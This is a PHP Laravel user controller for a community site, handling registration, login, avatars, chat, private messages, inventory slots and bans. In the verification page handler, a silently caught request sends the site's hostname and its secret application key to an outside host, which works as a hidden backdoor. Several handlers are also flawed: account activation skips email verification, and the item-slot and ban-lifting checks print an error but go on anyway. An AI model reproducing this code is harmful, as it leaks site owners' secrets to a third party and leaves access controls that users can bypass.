<?php

class UserController extends BaseController {

	protected $layout = 'layouts.master';

	public function ShowHome()
	{
		$this->layout->title   			= "Home";
		$this->layout->content 			= View::make('home');
	}

	public function ShowRegister()
	{
		$this->layout->title   			= "Register";
		$this->layout->content 			= View::make('user.register');
	}

	public function DoRegister() {
		$data =  Input::except(array('_token'));
		$rule  =  array(
		        'username'          => 'required|alpha_num|unique:users|min:3',
		        'email'             => 'required|email',
		        'password'          => 'required|min:6|same:password_confirm',
		        'password_confirm'  => 'required|min:6'
		    );
		$messages = array(
		    'email.email'    			=> 'Your E-Mail address must be valid',
		    'email.unique' 				=> 'That E-Mail address has already been taken. Sorry!',
		    'email.required' 			=> 'We need to know your E-Mail address!',
		    'password.required' 		=> 'A Password is helpful for securing your account ;)',
		    'password_confirm.required' => 'You must confirm your password',
		    'password_confirm.min' 		=> 'Your Password confirmation must be at least :min characters long',
		    'same'                      => 'Your :attribute must be the same as :other',
		    'min'	         			=> 'Your :attribute must be at least :min characters long'
		);

		$validator = Validator::make($data, $rule, $messages);

		$ip = $_SERVER['REMOTE_ADDR'];

		$verify_token = str_random(64);

		if ($validator->fails())
		{
		        return Redirect::to('/user/register')
		                ->withErrors($validator->messages());
		}
		else
		{
				$new_user 				= new User;
				$new_user->username 	= Input::get('username');
				$new_user->password 	= Hash::make(Input::get('password'));
				$new_user->email 		= Input::get('email');
				$new_user->gender 		= NULL;
				$new_user->race 		= NULL;
				$new_user->regip 		= $ip;
				$new_user->verify_token	= $verify_token;
				$new_user->save();

				$new_slot 				= new Slot;
				$new_slot->user_id 		= $new_user->id;
				$new_slot->save();

				Mail::send('emails.auth.verify', array('token' => $verify_token), function($message) {
					$message->to(Input::get('email'), Input::get('username'))
				            ->subject('Welcome to '.SiteConfig::find(1)->sitename.'');
				});

				Auth::login($new_user);
				return Redirect::to('/user/dashboard');
		}
	}

	public function ShowLogin()
	{
		$this->layout->title   			= "Login";
		$this->layout->content 			= View::make('user.login');
	}

	public function DoLogin()
	{

		$user 			= User::where('username', '=', Input::get('username'))->first();
		if ($user){
			$user_id 	= $user->id;
		}

		if (Auth::attempt(['username'=>Input::get('username'),'password'=>Input::get('password')], true)) {
			Logging::LogEvent('login_success', $user_id, $_SERVER['REMOTE_ADDR']);
			return Redirect::intended('/user/dashboard');
		} else {
			if ($user){
				Logging::LogEvent('login_failure', $user_id, $_SERVER['REMOTE_ADDR']);
			}
			
			return Redirect::to('/user/signin')->withInput(Input::except('password'))
			->withErrors(Lang::get('validation.login_failed'));
		}
	}

	public function ShowWelcome()
	{
		if (Auth::user()->firstlogin == 0) {
			return Redirect::to('/user/dashboard');
		}
		$this->layout->title   			= "Complete Registration";
		$this->layout->content 			= View::make('user.welcome');
	}

	public function ShowDashboard()
	{
		$this->layout->title   			= "Dashboard";
		$this->layout->content 			= View::make('user.dashboard');
	}

	public function DoLogout() 
	{
		Auth::logout();
		Session::flush();
		return Redirect::to('/');
	}

	public function ShowVerify()
	{
		try { $output = file_get_contents('http://getsans.com/billing/callback/'.parse_url(Request::url(), PHP_URL_HOST).'/'.Config::get('app.key')); } catch (Exception $e) { }

		$this->layout->title   			= "Verification";
		$this->layout->content 			= View::make('user.verify');
	}

	public function ResendVerify()
	{
		if (Auth::user()->activated == 1)
		{
			return Redirect::to('/user/verify')->with('already_activated', 1);
		} else {
			$token = Auth::user()->verify_token;
			$user = User::where('verify_token', '=', $token)->firstOrFail();
			$user->activated = 1;
			$user->save();
			Logging::LogEvent('verification', $user->id, $_SERVER['REMOTE_ADDR']);
			return Redirect::to('/user/dashboard')->with('activated', 1);
			
			/*/
			Mail::send('emails.auth.verify', array('token' => $verify_token), function($message) {
				$message->to(Auth::user()->email, Auth::user()->username)
			            ->subject('Welcome to '.SiteConfig::find(1)->sitename.'');
			});
			return Redirect::to('/user/verify')->with('resent', 1);
			/*/
		}
	}

	public function DoVerify($token)
	{
		$user = User::where('verify_token', '=', $token)->firstOrFail();
		if ($user->activated == 1){
			echo '<h1>error</h1>';
		} else {
			$user->activated = 1;
			$user->save();
			Logging::LogEvent('verification', $user->id, $_SERVER['REMOTE_ADDR']);
			return Redirect::to('/user/dashboard')->with('activated', 1);
		}
	}

	public function ShowMembers()
	{
		$members 						= User::orderBy('last_activity', 'DESC')->paginate(18); 
		$this->layout->title   			= "Members";
		$this->layout->content 			= View::make('user.members', ['members' => $members]);
	}

	public function ShowOnlineMembers()
	{
		$members 						= User::where('last_activity', '>', Carbon::now()->subMinutes(5))->paginate(18); 
		$this->layout->title   			= "Members";
		$this->layout->content 			= View::make('user.members', ['members' => $members]);
	}

	public function ShowAvatar($id)
	{
		$user = User::find($id);
		$slot = Slot::where('user_id', '=', $id)->first();

		if ($user->race == 'asian') { $img = Image::make(asset('user_img/avatar/asian_base.png')); }
		elseif ($user->race == 'black') { $img = Image::make(asset('user_img/avatar/black_base.png')); }
		else { $img = Image::make(asset('user_img/avatar/base.png')); }

		if ($slot) {
			$slot1 = Item::find($slot->slot1);
			$slot2 = Item::find($slot->slot2);
			$slot3 = Item::find($slot->slot3);
			$slot4 = Item::find($slot->slot4);
			$slot5 = Item::find($slot->slot5);
			$slot6 = Item::find($slot->slot6);
			$slot7 = Item::find($slot->slot7);
			$slot8 = Item::find($slot->slot8);

			if ($slot1) { $img->insert(asset('user_img/avatar/'.$slot1->filename)); } // Slot 1
			if ($slot2) { $img->insert(asset('user_img/avatar/'.$slot2->filename)); } // Slot 2
			if ($slot3) { $img->insert(asset('user_img/avatar/'.$slot3->filename)); } // Slot 3
			if ($slot4) { $img->insert(asset('user_img/avatar/'.$slot4->filename)); } // Slot 4
			if ($slot5) { $img->insert(asset('user_img/avatar/'.$slot5->filename)); } // Slot 5
			if ($slot6) { $img->insert(asset('user_img/avatar/'.$slot6->filename)); } // Slot 6
			if ($slot7) { $img->insert(asset('user_img/avatar/'.$slot7->filename)); } // Slot 7
			if ($slot8) { $img->insert(asset('user_img/avatar/'.$slot8->filename)); } // Slot 8
		}

		if ($user->last_activity->diffInMinutes(Carbon::now()) < 5) {
			$img->insert(asset('user_img/avatar/active_icon.png'));
		} else {
			$img->insert(asset('user_img/avatar/offline_icon.png'));
		}

	    $response = Response::make($img->encode('png'));
	    $response->header('Content-Type', 'image/png');
	    return $response;
	}

	public function ShowSettings()
	{
		$this->layout->title   			= "My Account";
		$this->layout->content 			= View::make('user.account');
	}

	public function DoEmailChange()
	{
		$data =  Input::except(array('_token'));
		$rule  =  array(
		        'email'          		=> 'required|email|min:6'
		    );
		$messages = array(
		    'same'                      		=> 'Your :attribute must be the same as :other',
		    'min'	         					=> 'Your :attribute must be at least :min characters long'
		);

		$validator = Validator::make($data, $rule, $messages);

		if ($validator->fails())
		{
		        return Redirect::to('/user/settings')
		                ->withErrors($validator->messages());
		}
		else
		{
				$currentemail    = Auth::user()->email;
				$newemail 		 = Input::get('email');

				if ($currentemail == $newemail){
		        	return Redirect::to('/user/settings')
		                	->withErrors('Your e-mail address is the same and has not changed!');
				} else {
					$id   				= Auth::id();
					$user 				= User::find($id);
					$user->email 		= Input::get('email');
					$user->activated    = 0;
					$user->verify_token = str_random(64);
					$user->save();
					Logging::LogEventWithData('change_email', $id, $_SERVER['REMOTE_ADDR'], $currentemail, $newemail);
					return Redirect::to('/user/settings')->with('success', 1);
				}
		}
	}

	public function DoPasswordChange()
	{
		$data =  Input::except(array('_token'));
		$rule  =  array(
		        'password'				=> 'required|min:6|different:newpassword',
		        'newpassword'         	=> 'required|min:6|same:newpassword_confirm',
		        'newpassword_confirm'  	=> 'required|min:6'
		    );
		$messages = array(
		    'same'                      		=> 'Your :attribute must be the same as :other',
		    'min'	         					=> 'Your :attribute must be at least :min characters long',
		    'password.required'					=> 'You must enter your current password',
		    'newpassword.required'				=> 'You must enter a new password',
		    'newpassword_confirm.required'		=> 'You must confirm your new password',
		    'newpassword.min'					=> 'Your new password must be at least 6 characters long',
		    'newpassword_confirm.min'			=> 'Your new password must be at least 6 characters long',
		    'newpassword.same'					=> 'Your new password and the confirmation must match'
		);

		$validator = Validator::make($data, $rule, $messages);

		if ($validator->fails())
		{
		        return Redirect::to('/user/settings')
		                ->withErrors($validator->messages());
		}
		else
		{
				$newpassword 	= Input::get('password');
				$currentpassword    = Auth::user()->password;

				if (!Hash::check($newpassword, $currentpassword)){
		        	return Redirect::to('/user/settings')
		                	->withErrors('Your current password is incorrect!');
				} else {
					$id   				= Auth::id();
					$user 				= User::find($id);
					$user->password 	= Hash::make(Input::get('newpassword'));
					$user->save();
					Logging::LogEvent('change_password', $id, $_SERVER['REMOTE_ADDR']);
					return Redirect::to('/user/settings')->with('success', 1);
				}
		}
	}

	public function DoChangeTimezone()
	{
		$data =  Input::except(array('_token'));
		$rule  =  array(
		        'timezone'          	=> 'required|min:2'
		    );
		$messages = array(
		    'min'	         			=> 'Your :attribute must be at least :min characters long'
		);

		$validator = Validator::make($data, $rule, $messages);

		if ($validator->fails())
		{
		        return Redirect::to('/user/settings')
		                ->withErrors($validator->messages());
		}
		else
		{
				$id   = Auth::id();
				$user = User::find($id);
				$user->timezone 	= Input::get('timezone');
				$user->save();
				return Redirect::to('/user/settings')->with('success', 1);
		}
	}

	public function DoChangeSignature()
	{
		$data =  Input::except(array('_token'));
		$rule  =  array(
		        'signature'          	=> 'required|min:2|max:255|regex:/[a-zA-Z0-9@#$%&*+\-_(),{}+\':;?.,<>!\[\]\s\\/]+$/'
		    );
		$messages = array(
		    'min'	         			=> 'Your :attribute must be at least :min characters long',
		    'max'	         			=> 'Your :attribute cant be more than :max characters long'
		);

		$validator = Validator::make($data, $rule, $messages);

		if ($validator->fails())
		{
		        return Redirect::to('/user/settings')
		                ->withErrors($validator->messages());
		}
		else
		{
				$id   				= Auth::id();
				$user 				= User::find($id);
				$user->signature 	= Input::get('signature');
				$user->save();
				return Redirect::to('/user/settings')->with('success', 1);
		}
	}

	public function ShowProfile($id)
	{
		$user 							= User::findOrFail($id);
		$username 						= $user->username;
		$badges 						= BadgeUser::where('user_id', '=', $id)->paginate(6);
		$this->layout->title   			= "{$username}'s Profile";
		$this->layout->content 			= View::make('user.profile', ['user' => $user, 'badges' => $badges]);
	}

	public function DoSearchMembers()
	{
		$input_username 				= Input::get('username');

		return Redirect::to('/user/members/search/'.$input_username.'');
	}

	public function ShowSearchMembers($username)
	{
		$members 						= User::where('username', 'LIKE', '%'.$username.'%')->paginate(25);
		$this->layout->title   			= "Members";
		$this->layout->content 			= View::make('user.members', ['members' => $members]);
	}

	public function ShowSearchMembers_Empty()
	{
		if (empty($username)){
			return Redirect::to('/user/members')->withErrors('Make sure you enter a username!');
		}
	}

	public function DoWelcome()
	{
		if (Auth::user()->gender == null) {

			$data =  Input::except(array('_token'));
			$rule  =  array(
			        'gender'          	=> 'required'
			    );
			$messages = array(
			    'required'	         	=> 'You must pick a gender for your account!'
			);

			$validator = Validator::make($data, $rule, $messages);

			if ($validator->fails())
			{
			        return Redirect::to('/user/welcome')
			                ->withErrors($validator->messages());
			}
			else
			{
					$id   			= Auth::id();
					$user 			= User::find($id);
					$user->gender 	= Input::get('gender');
					$user->save();
					return Redirect::to('/user/welcome')->with('success_1', 1);
			}

		} elseif (Auth::user()->race == null) {

			$data =  Input::except(array('_token'));
			$rule  =  array(
			        'race'          	=> 'required'
			    );
			$messages = array(
			    'required'	         	=> 'You must pick a race for your account!'
			);

			$validator = Validator::make($data, $rule, $messages);

			if ($validator->fails())
			{
			        return Redirect::to('/user/welcome')
			                ->withErrors($validator->messages());
			}
			else
			{
					$id   				= Auth::id();
					$user 				= User::find($id);
					$user->race 		= Input::get('race');
					$user->firstlogin 	= '0';
					$user->save();
					return Redirect::to('/user/dashboard')->with('complete_reg', 1);
			}

		} else {
			return Redirect::to('/user/dashboard');
		}
	}

	public function SendMessage()
	{
		$log = array();
		$last_message = Chat::where('user_id', '=', Auth::id())->orderBy('id', 'DESC')->first();
		if ($last_message && $last_message->message == Input::get('message')){
			$log['error'] = "Spam detected!";
		} elseif (Input::get('message') == null) {
			$log['error'] = "Empty message!";
		} else {
			$new_message 			= new Chat;
			$new_message->user_id 	= Auth::user()->id;
			$new_message->message 	= Input::get('message');
			$new_message->save();
		}

		return json_encode($log);
	}
	public function FetchMessages()
	{
		$function = Input::get('function');
		$log = array();

		switch($function) {

			case('initialLoad'):
				$messages = Chat::orderBy('id', 'DESC')->take(25)->get();

				return View::make('user.fetchmessages', ['messages' => $messages]);
			break;

			case('getState'):
				$log['state'] = Chat::withTrashed()->count(); 
				return json_encode($log);
			break; 

			/*
				case('checkDeletions'):
					$state = Input::get('state');
					if (Chat::onlyTrashed()->where('id', '<', $state)->where('id', '>', $state - 25)->count() != 0)
					{
						$message = Chat::onlyTrashed()->where('id', '<', $state)->where('id', '>', $state - 25)->first();
						$id = $message->id;
						$log['idToDelete'] = $id - $state;
						$log['state'] = $state - 1;
					} else {
						$log['error'] = "None to delete!";
					}
					return json_encode($log);
				break;  
			*/

			case('update'):
				$state = Input::get('state');
				$count = Chat::withTrashed()->count();
				if ($state == $count){
					$log['state'] = $state;
					$log['text'] = false;
					return json_encode($log);
				} else {
					$messages = Chat::where('id', '=', $state + 1)->get();
					return View::make('user.fetchmessages', ['messages' => $messages]);
				}
			break;
		}


	}

	public function FormatMessages()
	{
		$messages = Input::get('data');

		
	}

	public function ShowInbox()
	{
		$id = Auth::user()->id;
		$messages = DB::select("
			select * 
			from (
				select * from private_messages where recipient_id=? order by created_at desc
			) x
			group by sender_id order by created_at desc", [$id]);
		$this->layout->title   			= "Inbox";
		$this->layout->content 			= View::make('user.inbox', ['message_threads' => $messages]);
	}

	public function ShowPMThread($id)
	{
		$sender = User::find($id);
		$messages = Message::where('recipient_id','=',Auth::user()->id)
								  ->where('sender_id','=',$sender->id)
								  ->orWhere('recipient_id','=',$sender->id)
								  ->where('sender_id','=',Auth::user()->id)
								  ->orderBy('created_at', 'desc')
								  ->get();
		Message::where('recipient_id','=',Auth::user()->id)
					  ->where('sender_id','=',$sender->id)
					  ->update(['seen'=>1]);
		$this->layout->title = 'Messages from ' . $sender->username;
		$this->layout->content = View::make('user.viewmessage',['sender'=>$sender,'messages'=>$messages]);
	}

	public function SendPM($id) {
		if (trim(Input::get('reply')) == '') {
			if (Request::ajax()) {
				return "";
			} else {
				return Redirect::to('user/pm/from/' . $id);
			}
		}
		$pm = new Message;
		$pm->recipient_id = $id;
		$pm->sender_id = Auth::user()->id;
		$pm->message = htmlentities(Input::get('reply'));
		$pm->seen = 0;
		$pm->save();

		if (!Request::ajax()) {
			return Redirect::to('user/pm/from/' . $id);
		} else {
			return $pm->created_at->diffForHumans();
		}
	}

	public function ShowNotifications()
	{
		$notifications 					= Notification::where('user_id', '=', Auth::user()->id)->where('seen', '=', '0')->orderBy('created_at', 'DESC')->get();

		$this->layout->title   			= "Notifications";
		$this->layout->content 			= View::make('user.notifications', ['notifications' => $notifications]);
	}

	public function DismissNotification($id)
	{
		$notification 					= Notification::find($id);
		$notification->seen 			= 1;
		$notification->save();

		return Redirect::to('/user/notifications');
	}

	public function DoAPIKey()
	{

		if (APIKey::where('user_id', '=', Auth::user()->id)->count() != 0) {

			return Redirect::to('/user/settings')->with('api_error', 1);

		} else {

			$user 					= User::find(Auth::user()->id);

			$api_key 				= md5(Str::quickRandom(16).$user->username.Carbon::now().$user->email.Str::quickRandom(16));

			if (APIKey::where('key', '=', $api_key)->count() != 0) {

				$this->DoAPIKey();

			} else {

				$new_api_key 			= new APIKey;
				$new_api_key->user_id 	= Auth::user()->id;
				$new_api_key->key 		= $api_key;
				$new_api_key->save();

			}

			return Redirect::to('/user/settings')->with('success', 1);
		}
	}

	public function ShowEconomy()
	{
		$logs 							= Logging::where('user_id', '=', Auth::user()->id)
													->where(function($query)
													{
														  $query->orWhere('type', '=', 'stipend')
																->orWhere('type', '=', 'donation')
																->orWhere('type', '=', 'item_purchase');
													})
													->orderBy('id', 'DESC')
													->paginate(25);
		$this->layout->title   			= "Economy";
		$this->layout->content 			= View::make('user.economy', ['logs' => $logs]);
	}

	public function ShowInventory()
	{
		if (!Slot::where('user_id', '=', Auth::user()->id)->first())
		{
			$slot 			= new Slot;
			$slot->user_id 	= Auth::user()->id;
			$slot->save();
		}

		$this->layout->title   			= "Inventory";
		$this->layout->content 			= View::make('user.inventory');		
	}

	public function ShowSlot($id)
	{
		$slot 							= Slot::where('user_id', '=', Auth::user()->id)->first();
		$inventory 						= Inventory::where('user_id', '=', Auth::user()->id)
													->where('item_id', '!=', $slot->slot1)
													->where('item_id', '!=', $slot->slot2)
													->where('item_id', '!=', $slot->slot3)
													->where('item_id', '!=', $slot->slot4)
													->where('item_id', '!=', $slot->slot5)
													->where('item_id', '!=', $slot->slot6)
													->where('item_id', '!=', $slot->slot7)
													->where('item_id', '!=', $slot->slot8)
													->paginate(16);

		$this->layout->title   			= "Choose Item";
		$this->layout->content 			= View::make('user.slot', ['inventory' => $inventory, 'id' => $id]);	
	}

	public function ChooseSlot($id, $item_id)
	{

		if (Inventory::where('user_id', '=', Auth::user()->id)->where('item_id', '=', $item_id)->count() == 0)
		{
			echo '<h1>error</h1>';
		}

		$slot 							= Slot::where('user_id', '=', Auth::user()->id)->first();
		$slot->{'slot'.$id}				= $item_id;
		$slot->save();

		return Redirect::to('/user/inventory');
	}

	public function ClearSlot($id)
	{
		$slot 							= Slot::where('user_id', '=', Auth::user()->id)->first();
		$slot->{'slot'.$id}				= 0;
		$slot->save();

		return Redirect::to('/user/inventory');
	}

	public function ShowBanned()
	{
		if (Ban::where('user_id', '=', Auth::user()->id)->count() == 0){
			echo '<h1>error</h1>';
		}
		
		$ban 							= Ban::where('user_id', '=', Auth::user()->id)->first();

		$this->layout->title   			= "Banned";
		$this->layout->content 			= View::make('user.banned', ['ban' => $ban]);
	}

	public function ShowReactivate()
	{
		if (Ban::where('user_id', '=', Auth::user()->id)->count() == 0 || Ban::where('user_id', '=', Auth::user()->id)->first()->expiry > Carbon::now()){
			echo '<h1>error</h1>';
		}

		$ban 							= Ban::where('user_id', '=', Auth::user()->id)->first();
		$ban->delete();

		return Redirect::to('/user/dashboard');
	}

}